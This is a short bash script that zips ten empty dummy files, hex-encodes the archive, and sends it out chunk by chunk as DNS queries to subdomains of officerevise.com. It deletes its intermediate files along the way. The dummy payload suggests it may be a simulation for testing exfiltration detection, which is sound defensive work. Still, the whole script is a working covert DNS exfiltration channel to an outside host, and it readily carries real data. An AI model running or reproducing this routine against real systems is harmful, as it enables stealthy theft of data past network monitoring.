#! /bin/bash
 
cd ~/Desktop
touch 1.tmp 2.tmp 3.tmp 4.tmp 5.tmp 6.tmp 7.tmp 8.tmp 9.tmp 10.tmp
zip fakefile.zip *.tmp
rm 1.tmp 2.tmp 3.tmp 4.tmp 5.tmp 6.tmp 7.tmp 8.tmp 9.tmp 10.tmp
xxd -p fakefile.zip > data
rm fakefile.zip
for dat in `cat data `; do dig $dat.officerevise.com; done
rm data
dig officerevise.com
